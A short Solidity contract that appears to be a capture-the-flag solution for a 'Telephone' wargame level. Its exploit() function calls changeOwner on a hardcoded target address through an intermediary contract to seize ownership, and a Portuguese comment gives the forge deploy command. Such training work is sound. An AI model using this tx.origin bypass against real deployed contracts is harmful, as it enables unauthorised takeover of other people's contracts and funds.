// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Ilevel04.sol";

//fazer deploy desse contrato por forge create Tele --private-key $PKEY --rpc-url $RPC_URL

contract Tele {
    Telephone level4 = Telephone(0xb29CF9EbdeF64Bf01eE2Db2e9a8417f1d685b3f8);

    function exploit() external {
        level4.changeOwner(0x692EAA5eD86aaEb2584232A44c790709D4308910);     
    }
}